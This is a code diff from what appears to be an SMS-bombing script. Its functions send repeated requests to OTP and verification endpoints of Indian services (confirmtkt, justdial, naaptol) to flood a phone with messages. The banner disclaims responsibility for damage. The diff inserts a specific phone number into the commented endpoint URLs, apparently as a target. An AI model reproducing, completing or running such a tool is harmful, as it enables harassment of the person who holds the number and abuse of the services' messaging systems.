@@ -30,11 +30,11 @@ def banner():
     Note : I won't be responsible for any damage caused by this script, Use at your own risk
 """)
 
-#https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=
+#https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=7412009362
 
-#http://t.justdial.com/api/india_api_write/10aug2016/sendvcode.php?mobile=
+#http://t.justdial.com/api/india_api_write/10aug2016/sendvcode.php?mobile=7412009362
 
-#https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=
+#https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=7412009362
 def send(num, counter, slep):
     #url = ["https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=","https://m.naaptol.com/faces/jsp/ajax/ajax.jsp?actionname=checkMobileUserExists&mobile=","https://t.justdial.com/api/india_api_write/10aug2016/sendvcode.php?mobile="]
     url="https://securedapi.confirmtkt.com/api/platform/register?mobileNumber="
